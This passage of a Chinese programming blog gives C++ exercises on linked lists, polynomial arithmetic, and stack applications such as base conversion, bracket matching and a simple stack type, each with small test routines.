class="params">()</span> </span>&#123;</span><br><span class="line">    DLL *L;</span><br><span class="line">    InitList(L);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; ListEmpty(L) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    ListInsert(L, <span class="number">1</span>, <span class="number">3</span>);</span><br><span class="line">    ListTraverse(L);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"ok"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    ListInsert(L, <span class="number">1</span>, <span class="number">4</span>);</span><br><span class="line">    ListTraverse(L);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"ok"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    ListInsert(L, <span class="number">2</span>, <span class="number">5</span>);</span><br><span class="line">    ListTraverse(L);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"ok"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    ListInsert(L, <span class="number">4</span>, <span class="number">6</span>);</span><br><span class="line">    ListTraverse(L);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"ok"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; ListLength(L) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    ListDelete(L, <span class="number">2</span>, x);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    ListTraverse(L);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"ok"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; ListLength(L) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"----------------------"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    ListInsert(L, <span class="number">3</span>, <span class="number">7</span>);</span><br><span class="line">    ListTraverse(L);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"ok"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; ListLength(L) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    NextElem(L, <span class="number">6</span>, x);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    PriorElem(L, <span class="number">6</span>, x);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    NextElem(L, <span class="number">7</span>, x);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    GetElem(L, <span class="number">3</span>, x);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; ListEmpty(L) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    DestoryList(L);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; ListEmpty(L) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="多项式"><a href="#多项式" class="headerlink" title="多项式"></a>多项式</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">    <span class="keyword">double</span> a;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    Node* nxt;</span><br><span class="line">    Node() &#123;</span><br><span class="line">        a=<span class="number">0</span>; n=<span class="number">0</span>; nxt=<span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Node(<span class="keyword">double</span> a, <span class="keyword">int</span> n, Node* nxt=<span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;a = a; <span class="keyword">this</span>-&gt;n = n; <span class="keyword">this</span>-&gt;nxt = nxt;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Polynomial</span> &#123;</span></span><br><span class="line">    Node* head;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">    Polynomial() &#123; <span class="keyword">this</span>-&gt;head=<span class="literal">NULL</span>; <span class="keyword">this</span>-&gt;size=<span class="number">0</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreatePolyn</span><span class="params">(Polynomial* &amp;P, <span class="keyword">int</span> m)</span> </span>&#123;</span><br><span class="line">    P = <span class="keyword">new</span> Polynomial();</span><br><span class="line">    Node *p=P-&gt;head,*q=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=m; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> x,y;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; x &gt;&gt; y;</span><br><span class="line">        p = <span class="keyword">new</span> Node(x, y);</span><br><span class="line">        <span class="keyword">if</span>(i==<span class="number">1</span>) P-&gt;head=p;</span><br><span class="line">        <span class="keyword">if</span>(q) q-&gt;nxt=p;</span><br><span class="line">        q=p;</span><br><span class="line">    &#125; P-&gt;size = m;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DestroyPolyn</span><span class="params">(Polynomial* &amp;P)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(Node* p=P-&gt;head, *q=<span class="literal">NULL</span>; p; p=p-&gt;nxt) &#123;</span><br><span class="line">        <span class="keyword">if</span>(q) <span class="keyword">delete</span> q; q=p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">delete</span> P;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrintPolyn</span><span class="params">(Polynomial *P)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(P==<span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"f(x) = "</span>;</span><br><span class="line">    <span class="keyword">if</span>(!P-&gt;size) <span class="built_in">cout</span> &lt;&lt; <span class="string">"0"</span>; </span><br><span class="line">    <span class="keyword">for</span>(Node *p=P-&gt;head; p; p=p-&gt;nxt) &#123;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;a &gt; <span class="number">0</span>) <span class="built_in">cout</span> &lt;&lt; <span class="string">"+"</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; p-&gt;a &lt;&lt; <span class="string">"x^"</span> &lt;&lt; p-&gt;n &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">    &#125;<span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">PolynLength</span><span class="params">(Polynomial *P)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(P==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> P-&gt;size;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddPolyn</span><span class="params">(Polynomial *&amp;Pa, Polynomial *&amp;Pb)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Pa==<span class="literal">NULL</span> || Pb == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(Pa-&gt;size == <span class="number">0</span>) &#123; swap(Pa, Pb); <span class="keyword">return</span>; &#125;</span><br><span class="line">    <span class="keyword">if</span>(Pb-&gt;size == <span class="number">0</span>) &#123; <span class="keyword">return</span>; &#125;</span><br><span class="line">    <span class="keyword">if</span>(Pa-&gt;head-&gt;n &gt; Pb-&gt;head-&gt;n) swap(Pa, Pb);</span><br><span class="line">    <span class="keyword">int</span> Lb = PolynLength(Pb);</span><br><span class="line">    Node *p=Pa-&gt;head, *q=Pb-&gt;head;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=Lb; i++) &#123;</span><br><span class="line">        <span class="keyword">while</span>(p-&gt;nxt &amp;&amp; p-&gt;nxt-&gt;n &lt;= q-&gt;n) p=p-&gt;nxt;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;n == q-&gt;n) p-&gt;a+=q-&gt;a;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            Node *r = <span class="keyword">new</span> Node(q-&gt;a, q-&gt;n, p-&gt;nxt);</span><br><span class="line">            p-&gt;nxt = r; p=r; Pa-&gt;size++;</span><br><span class="line">        &#125;</span><br><span class="line">        q=q-&gt;nxt;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//    PrintPolyn(Pa);</span></span><br><span class="line">    <span class="keyword">for</span>(q=<span class="literal">NULL</span>, p=Pa-&gt;head; p; p=p-&gt;nxt) &#123;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;a==<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(q) q-&gt;nxt = p-&gt;nxt;</span><br><span class="line">            <span class="keyword">else</span> Pa-&gt;head = p-&gt;nxt;</span><br><span class="line">        &#125; <span class="keyword">else</span> q=p;</span><br><span class="line">    &#125;</span><br><span class="line">    DestroyPolyn(Pb);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SubtractPolyn</span><span class="params">(Polynomial *&amp;Pa, Polynomial *&amp;Pb)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Pa==<span class="literal">NULL</span> || Pb == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">for</span>(Node *q=Pb-&gt;head; q; q=q-&gt;nxt) q-&gt;a = -q-&gt;a;</span><br><span class="line">    AddPolyn(Pa, Pb);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MultiplyPolyn</span><span class="params">(Polynomial *&amp;Pa, Polynomial *&amp;Pb)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Pa==<span class="literal">NULL</span> || Pb == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">    Polynomial *Pc = <span class="keyword">new</span> Polynomial();</span><br><span class="line">    Node *q=Pb-&gt;head;</span><br><span class="line">    <span class="keyword">for</span>(; q; q=q-&gt;nxt) &#123;</span><br><span class="line">        Polynomial *Pd = <span class="keyword">new</span> Polynomial();</span><br><span class="line">        <span class="keyword">for</span>(Node *p=Pa-&gt;head, *lr=<span class="literal">NULL</span>; p; p=p-&gt;nxt) &#123;</span><br><span class="line">            Node *r=<span class="keyword">new</span> Node(p-&gt;a*q-&gt;a, p-&gt;n+q-&gt;n);</span><br><span class="line">            <span class="keyword">if</span>(lr) lr-&gt;nxt=r;</span><br><span class="line">            <span class="keyword">else</span> Pd-&gt;head=r;</span><br><span class="line">            lr=r;</span><br><span class="line">        &#125; Pd-&gt;size = Pa-&gt;size;</span><br><span class="line"><span class="comment">//        PrintPolyn(Pd);</span></span><br><span class="line">        AddPolyn(Pc, Pd);</span><br><span class="line"><span class="comment">//        PrintPolyn(Pc);</span></span><br><span class="line"><span class="comment">//        cout &lt;&lt; "------" &lt;&lt; endl;</span></span><br><span class="line">    &#125;</span><br><span class="line">    DestroyPolyn(Pa);</span><br><span class="line">    Pa=Pc;</span><br><span class="line">    DestroyPolyn(Pb);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试代码 仅经过小数据测试233<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Polynomial *Pa, *Pb;</span><br><span class="line">    CreatePolyn(Pa, <span class="number">3</span>);</span><br><span class="line">    PrintPolyn(Pa);</span><br><span class="line">    </span><br><span class="line">    CreatePolyn(Pb, <span class="number">3</span>);</span><br><span class="line">    PrintPolyn(Pb);</span><br><span class="line">    </span><br><span class="line"><span class="comment">//    AddPolyn(Pa, Pb);</span></span><br><span class="line"><span class="comment">//    SubtractPolyn(Pa, Pb);</span></span><br><span class="line">    MultiplyPolyn(Pa, Pb);</span><br><span class="line">    PrintPolyn(Pa);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="栈和队列"><a href="#栈和队列" class="headerlink" title="栈和队列"></a>栈和队列</h2><p>栈的几个应用</p><h3 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">105</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Stack</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> a[N];</span><br><span class="line">    <span class="keyword">int</span> tp;</span><br><span class="line">    </span><br><span class="line">    Stack() &#123; tp = <span class="number">0</span>; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">top</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> a[tp]; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123; a[++tp]=x; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">pop</span><span class="params">()</span> </span>&#123; --tp; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">empty</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> tp==<span class="number">0</span>; &#125;</span><br><span class="line">&#125; stk;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x, y;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; x &gt;&gt; y;</span><br><span class="line">    <span class="keyword">for</span>(;x;) &#123;</span><br><span class="line">        stk.push(x%y); x/=y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(;!stk.empty(); stk.pop()) <span class="built_in">cout</span> &lt;&lt; stk.top();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="括号匹配"><a href="#括号匹配" class="headerlink" title="括号匹配"></a>括号匹配</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">105</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Stack</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> a[N];</span><br><span class="line">    <span class="keyword">int</span> tp;</span><br><span class="line">    </span><br><span class="line">    Stack() &#123; tp = <span class="number">0</span>; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">top</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> a[tp]; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123; a[++tp]=x; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">pop</span><span class="params">()</span> </span>&#123; --tp; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">empty</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> tp==<span class="number">0</span>; &#125;</span><br><span class="line">&#125; stk;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">string</span> s;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; s;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;s.length(); i++) &#123;</span><br><span class="line"><span class="comment">//        cout &lt;&lt; i &lt;&lt; " " &lt;&lt; s[i] &lt;&lt; endl;</span></span><br><span class="line">        <span class="keyword">if</span>(s[i]==<span class="string">'('</span> || s[i]==<span class="string">'['</span>) stk.push(s[i]);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(s[i]==<span class="string">')'</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(stk.empty() || stk.top()!=<span class="string">'('</span>) &#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">"error"</span> &lt;&lt; <span class="built_in">endl</span>;<span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">            <span class="keyword">else</span> stk.pop();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(s[i]==<span class="string">']'</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(stk.empty() || stk.top()!=<span class="string">'['</span>) &#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">"error"</span> &lt;&lt; <span class="built_in">endl</span>;<span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">            <span class="keyword">else</span> stk.pop();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!stk.empty()) <span class="built_in">cout</span> &lt;&lt; <span class="string">"error"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">cout</span> &lt;&lt; <span class="string">"right"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">105</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Stack</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> stk[N], top;</span><br><span class="line">    Stack() &#123;</span><br><span class="line">        <span class="built_in">memset</span>(stk, <span class="number">0</span>, <span class="keyword">sizeof</span>(stk));</span><br><span class="line">        top = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitStack</span><span class="params">(Stack* &amp;S)</span> </span>&#123;</span><br><span class="line">    S=<span class="keyword">new</span> Stack();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DestoryStack</span><span class="params">(Stack *&amp;S)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S!=<span class="literal">NULL</span>) <span class="keyword">delete</span> S;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ClearStack</span><span class="params">(Stack *&amp;S)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(S-&gt;stk, <span class="number">0</span>, <span class="keyword">sizeof</span>(S-&gt;stk));</span><br><span class="line">    S-&gt;top=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">StackEmpty</span><span class="params">(Stack *S)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> S==<span class="literal">NULL</span> || S-&gt;top == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">StackLength</span><span class="params">(Stack *S)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> S==<span class="literal">NULL</span> ? <span class="number">0</span> : S-&gt;top;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetTop</span><span class="params">(Stack *S, <span class="keyword">int</span> &amp;e)</span> </span>&#123;</span><br><span class="line">    e=(S==<span class="literal">NULL</span>?<span class="number">0</span>:S-&gt;stk[S-&gt;top]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Push</span><span class="params">(Stack* &amp;S, <span class="keyword">int</span> e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S==<span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">    S-&gt;stk[++S-&gt;top] = e;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Pop</span><span class="params">(Stack* &amp;S, <span class="keyword">int</span> &amp;e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S==<span class="literal">NULL</span> || S-&gt;top==<span class="number">0</span>) &#123; e=<span class="number">0</span>; <span class="keyword">return</span>; &#125;</span><br><span class="line">    e = S-&gt;stk[S-&gt;top--];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">StackTraverse</span><span class="params">(Stack *S)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S==<span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=S-&gt;top; i++) <span class="built_in">cout</span> &lt;&lt; S-&gt;stk[i] &lt;&lt; <span class="string">"- "</span>[i==S-&gt;top];</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Stack *S; <span class="keyword">int</span> top;</span><br><span class="line">    InitStack(S);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; StackLength(S) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    Push(S, <span class="number">1</span>);</span><br><span class="line">    GetTop(S, top);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; top &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    StackTraverse(S);</span><br><span class="line">    Push(S, <span class="number">2</span>);</span><br><span class="line">    StackTraverse(S);</span><br><span class="line">    Pop(S, top);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; top &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    StackTraverse(S);</span><br><span class="line">    Push(S, <span class="number">3</span>);</span><br><span class="line">    StackTraverse(S);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1234出栈顺序"><a href="#1234出栈顺序" class="headerlink" title="1234出栈顺序"></a>1234出栈顺序</h3><p>DFS搜索回溯 一共14种<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 